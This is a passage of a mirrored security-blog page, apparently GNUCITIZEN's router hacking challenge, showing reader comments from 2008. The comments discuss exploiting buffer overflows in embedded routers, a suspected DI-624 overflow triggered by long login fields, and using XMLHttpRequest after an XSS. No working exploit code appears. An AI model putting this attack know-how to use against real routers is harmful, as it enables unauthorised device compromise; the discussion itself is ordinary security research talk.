+<p>exploiting buffer overflows for these devices is as trivial as it can get but the only thing that is a problem is to either login into the device and observe any strange messages appearing in the log files which could indicate what the problem is, or attach yourself directly to the device motherboard via JTAG. the second is a bit more complicated. Once we have this information we can verify the exploitability of the problem by mangling with the address space and if passes all test we can sit down and spend time writing payload/shellcode for the affected architecture if there isn&#8217;t one yet.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-117486">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0808e465afcddf24dcea0b5b127fee05?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://klo-2k.spaces.live.com/' rel='external nofollow' class='url'>klo</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-117486">
+			March 26, 2008 at 11:27 am</a>		</div>
+
+		<p>&#8220;&#8230;it is not very clear from your post but are you saying that the payload has to be 298+ characters long?&#8221;</p>
+<p>Yeah, for example, a 299 characters long username, or 149 char. long username with 150 char. password.  All characters were in the ASCII range.</p>
+<p>I basically came across this &#8220;http://secunia.com/advisories/29366/&#8221; and wanted to see if the DI-624 is also affected.</p>
+<p>I forgot to mention the hardware revision is C3.</p>
+<p>It seems like the source code for the device is available at &#8220;ftp://ftp.dlink.co.uk/GPL/DI-624_E1_GPL.tgz&#8221; but I haven&#8217;t had time to look over it yet&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-117801">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-117801">
+			April 3, 2008 at 10:31 am</a>		</div>
+
+		<p>bug: once you have a XSS vulnerability on the router, all you have to do is use the XMLHttpRequest() function in the JavaScript which is executed in the XSS attack:<br />
+<a href="http://www.quirksmode.org/js/xmlhttp.html" rel="nofollow">http://www.quirksmode.org/js/xmlhttp.html</a></p>
+<p>Check out exploit #2 for the BT Home Hub for a real example on how to do this: <a href="../bt-home-flub-pwnin-the-bt-home-hub-4/index.html" rel="nofollow">http://www.gnucitizen.org/blog.....ome-hub-4/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-117802">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-117802">
+			April 3, 2008 at 10:35 am</a>		</div>
+
+		<p>Regarding the DI-624 issue: yes, it could be a memory corruption bug (i.e: buffer overflow) but we shouldn&#8217;t ignore the possibility of a resource exhaustion issue, since the hardware of some embedded devices is very limited.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-118710">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/1f5fdd3f04963e7df10f4b8700ed7425?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">jigar</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118710">
+			April 13, 2008 at 7:17 am</a>		</div>
+
+		<p>hello<br />
+is it possible to hack router enable password.?</p>
+<p>I have router but i can&#8217;t logging enable mode.<br />
+so give me tips how  can i loging enable mode.<br />
+without rommon mode.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119854">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f7303bc83a9dee885db7829113ecf7a4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Kcir~</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119854">
+			April 25, 2008 at 7:34 pm</a>		</div>
+
+		<p>I Have a config.bin for decrypt password. so possible? <a href="http://rapidshare.com/files/110366829/config.bin.html" rel="nofollow">http://rapidshare.com/files/11.....g.bin.html</a></p>
+<p>Tks.. ;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-121548">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bb8557e7e33011fb588ae6cea0ea35b8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">john</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-121548">
+			May 11, 2008 at 10:23 pm</a>		</div>
+
+		<p>how to hack netgear administrator password</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-121655">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-121655">
+			May 12, 2008 at 4:06 pm</a>		</div>
+
+		<p>this is definitely not the place where you should ask these types of questions.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"><a href="comment-page-2/index.html#post-comments" >newer comments</a></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="680"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="61b133f42c" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/router-hacking-challenge/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:55:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
